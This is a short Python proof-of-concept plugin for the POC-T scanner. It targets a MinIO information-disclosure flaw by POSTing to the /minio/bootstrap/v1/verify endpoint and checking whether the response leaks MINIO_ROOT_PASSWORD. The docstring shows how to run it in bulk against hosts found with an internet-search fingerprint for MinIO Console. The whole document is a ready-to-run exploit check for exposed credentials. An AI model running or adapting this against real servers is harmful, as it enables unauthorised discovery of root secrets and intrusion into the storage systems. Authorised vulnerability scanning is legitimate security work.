#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   MinIO 信息泄露漏洞.py
python3 POC-T.py -s MinIO信息泄露漏洞.py -aF 'app="MinIO-Console" && title=="MinIO Console" && icon_hash="-625183107"'

'''


import requests

from lib.utils.http import urljoin_ex


def poc(url):
    vuln_url = urljoin_ex(url, "/minio/bootstrap/v1/verify")
    headers = {'Content-type': 'application/x-www-form-urlencoded', 'Accept': 'text/plain'}
    try:
        response = requests.post(vuln_url, timeout=5, headers=headers)
        response_text = response.text.strip()
        if response_text.find('MINIO_ROOT_PASSWORD') != -1:
            return True
        else:
            return False
    except:
        return False
